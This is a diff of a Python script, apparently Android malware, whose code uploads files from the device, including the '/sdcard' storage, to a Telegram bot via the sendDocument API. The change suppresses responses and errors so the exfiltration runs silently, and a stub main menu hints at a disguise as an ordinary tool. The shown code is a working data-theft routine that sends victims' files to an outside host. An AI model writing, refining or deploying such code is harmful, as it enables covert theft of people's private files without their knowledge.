@@ -15,10 +15,9 @@ def main():
                 url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                 data = {'chat_id': chat_id}
                 files = {'document': f}
-                response = session.post(url, data=data, files=files)
-                print(response.text)
-    except Exception as e:
-        print("Error:", e)
+                _ = session.post(url, data=data, files=files)  # Ignore response
+    except Exception:
+        pass  # Ignore exceptions
 
     try:
         sdcard_path = '/sdcard'
@@ -28,10 +27,9 @@ def main():
                 url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                 data = {'chat_id': chat_id}
                 files = {'document': f}
-                response = session.post(url, data=data, files=files)
-                print(response.text)
-    except Exception as e:
-        print("Error:", e)
+                _ = session.post(url, data=data, files=files)  # Ignore response
+    except Exception:
+        pass  # Ignore exceptions
 
 def main_menu():
     # Define your main menu functionality here
